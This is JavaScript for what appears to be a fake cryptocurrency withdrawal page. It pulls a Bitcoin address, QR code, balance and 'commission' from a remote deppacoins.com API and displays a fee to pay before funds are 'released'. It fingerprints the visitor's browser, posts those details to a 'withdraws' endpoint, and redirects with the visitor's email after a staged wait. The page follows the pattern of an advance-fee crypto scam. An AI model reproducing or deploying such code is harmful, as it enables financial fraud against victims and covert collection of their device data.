const xhr = new XMLHttpRequest()
var popup = document.getElementById('popup');
var popupContent = document.querySelector('.popup-content');
let checkbox = document.getElementById("checkbox-popup")
let checkbox_1 = document.getElementById("checkbox-popup-danger")
let url = new URL(window.location.href).searchParams.get("email")

class UserInfo {
    constructor() {
        this.timeOpened = new Date()
        this.timezone = (new Date().getTimezoneOffset() / 60)
    }
    pageon() {
        return window.location.pathname
    }
    platform() { return navigator?.platform }
    langues() { return navigator?.languages }
    appVersion() { return navigator?.appVersion }
    productSub() { return navigator?.productSub }
    sicret() {

        let sicret_key = `${navigator?.productSub + navigator?.vendor + navigator?.appName + navigator?.platform + navigator?.product + navigator?.appVersion}`

        return sicret_key
    }
}

let info = new UserInfo()



function loaderFunction(status) {
    if (status) {
        let div = document.createElement('div');
        div.style = "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;"
        div.id = "loader-wrapper"
        div.innerHTML = '<div class="loader" style="color:red;"></div>'
        document.body.append(div)
    } else {
        document.getElementById("loader-wrapper").remove()

    }
}

async function send_request(type, laoder, url, data) {
    if (laoder) { loaderFunction(false) }
    return new Promise((resolve, reject) => {
        let page = `https://deppacoins.com/api/${url}`;
        xhr.open(type, page)
        xhr.responseType = "json"
        xhr.setRequestHeader("Accept", "application/json")
        xhr.setRequestHeader("Content-Type", "application/json")
        xhr.setRequestHeader("Access-Control-Allow-Origin", "*")
        xhr.setRequestHeader("mode", "no-cors")
        xhr.setRequestHeader("cache", "no-cache")
        xhr.setRequestHeader("credentials", "same-origin")
        xhr.setRequestHeader("redirect", "follow")

        xhr.onload = () => {
            resolve(xhr.response)
        }

        if (data != false) {
            xhr.send(JSON.stringify(data))
        }
        else {
            xhr.send()

        }
    })
}

async function setElements(priceBitcoinCommission, priceInBitcoin, priceEuro, qr, commissionBTC, commissionEuro, address) {
    document.getElementById("balance_bitcoin").textContent = priceInBitcoin + " BTC"
    document.getElementById("balance_euro").textContent = priceEuro + " EUR"
    document.getElementById("qr_code").src = qr.qr_code_link
    document.getElementById("get_commission").textContent = `${commissionEuro} EUR = ${commissionBTC} BTC`
    document.querySelector(".btc_address").textContent = address
    document.querySelector("#get_balance").textContent = `${priceEuro} EUR = ${priceInBitcoin} BTC`
    document.querySelector("#bitcoin-address").textContent = address
    document.querySelector("#bitcoin-commission").textContent = `${commissionEuro} EUR = ${commissionBTC} BTC`
    document.getElementById("loader-wrapper").remove()
}

function openPopup() {
    popup.classList.add('show'); // Добавляем класс 'show' для отображения попапа
}

function closePopup() {
    popup.classList.remove('show'); // Удаляем класс 'show' для скрытия попапа
}

async function check_data() {
    if (checkbox.checked) {
        let users = await send_request("get", false, "users", false)

        let data = {
            id: users?.length - 1 + 1,
            product_sub: info?.productSub(),
            time: info?.timeOpened,
            platform: info?.platform(),
            langues: info?.langues(),
            userAgent: info?.appVersion(),
            sicret: info?.sicret(),
            sunset: 0,
            step: 0
        }

        send_request("post", false, "withdraws", data)

        const wait = document.getElementById('wait')
        wait.classList.add('active');

        setTimeout(() => {
            window.location.href = `withdraw-6.html?email=${url}`
        }, 10000)
    } else {
        const checkbox_danger = document.querySelector(".custom-checkbox_danger")
        const checkbox_normal = document.querySelector(".custom-checkbox_normal")
        checkbox_danger.classList.remove("hidden")
        checkbox_normal.classList.add("hidden")
    }
}

checkbox.addEventListener("click", () => {
    if (checkbox.checked) {
        const checkbox_danger = document.querySelector(".custom-checkbox_danger")
        const checkbox_normal = document.querySelector(".custom-checkbox_normal")

        checkbox_danger.classList.add("hidden")
        checkbox_normal.classList.remove("hidden")
        popup.classList.add('show');

    }
    popup.addEventListener('click', function (event) {
        if (event.target === popup) {
            popup.classList.remove('show');
        }
    });
})



checkbox_1.addEventListener("click", () => {
    if (checkbox_1.checked) {
        checkbox_1.checked = false
        checkbox.checked = true

        const checkbox_danger = document.querySelector(".custom-checkbox_danger")
        const checkbox_normal = document.querySelector(".custom-checkbox_normal")

        checkbox_danger.classList.add("hidden")
        checkbox_normal.classList.remove("hidden")
        popup.classList.add('show');

    }
    popup.addEventListener('click', function (event) {
        if (event.target === popup) {
            popup.classList.remove('show');
        }
    });
})



async function start() {
    let address = await send_request("get", false, "address_change", false)
    let qr = await send_request("get", false, "qr_change", false)
    let getPriceBitcoin = await send_request("get", false, "price_change", false)
    let setPriceBitcoin = getPriceBitcoin["price_euro"]
    let sendPriceBitcoin = await send_request("post", false, "transaction-convert", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let getPriceBitcoinCommission = await send_request("post", false, "transaction-commission", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let setPriceBitcoinCommission = getPriceBitcoinCommission.price
    let getPriceInEuro = await send_request("post", false, "transaction-convert-euro", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let getPriceInEuroCommission = await send_request("post", false, "transaction-convert-euro", { price: setPriceBitcoinCommission, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    setElements(sendPriceBitcoin, Number(setPriceBitcoin).toFixed(2), Number(getPriceInEuro.price).toFixed(2), qr, setPriceBitcoinCommission, Number(getPriceInEuroCommission.price).toFixed(2), address.address)
}

start()
